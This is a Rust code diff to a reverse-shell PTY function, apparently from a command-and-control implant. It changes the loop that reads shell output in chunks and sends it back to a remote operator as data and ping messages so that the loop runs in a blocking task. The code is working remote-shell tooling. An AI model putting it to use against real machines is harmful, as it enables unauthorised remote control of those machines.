@@ -88,10 +88,10 @@ pub async fn run_reverse_shell_pty<T: Transport>(
         }
     };
 
-    // Spawn task to send PTY output
+    // Spawn blocking task to send PTY output to avoid blocking the async runtime
     const CHUNK_SIZE: usize = 1024;
     let output_tx_clone = output_tx.clone();
-    tokio::spawn(async move {
+    tokio::task::spawn_blocking(move || {
         loop {
             let mut buffer = [0; CHUNK_SIZE];
             let n = match reader.read(&mut buffer[..]) {
@@ -120,12 +120,11 @@ pub async fn run_reverse_shell_pty<T: Transport>(
             }
 
             if let Err(_err) = output_tx_clone
-                .send(ReverseShellRequest {
+                .blocking_send(ReverseShellRequest {
                     kind: ReverseShellMessageKind::Data.into(),
                     data: buffer[..n].to_vec(),
                     task_id,
                 })
-                .await
             {
                 #[cfg(debug_assertions)]
                 log::error!("reverse_shell_pty output failed to queue: {_err}");
@@ -134,12 +133,11 @@ pub async fn run_reverse_shell_pty<T: Transport>(
 
             // Ping to flush
             if let Err(_err) = output_tx_clone
-                .send(ReverseShellRequest {
+                .blocking_send(ReverseShellRequest {
                     kind: ReverseShellMessageKind::Ping.into(),
                     data: Vec::new(),
                     task_id,
                 })
-                .await
             {
                 #[cfg(debug_assertions)]
                 log::error!("reverse_shell_pty ping failed: {_err}");
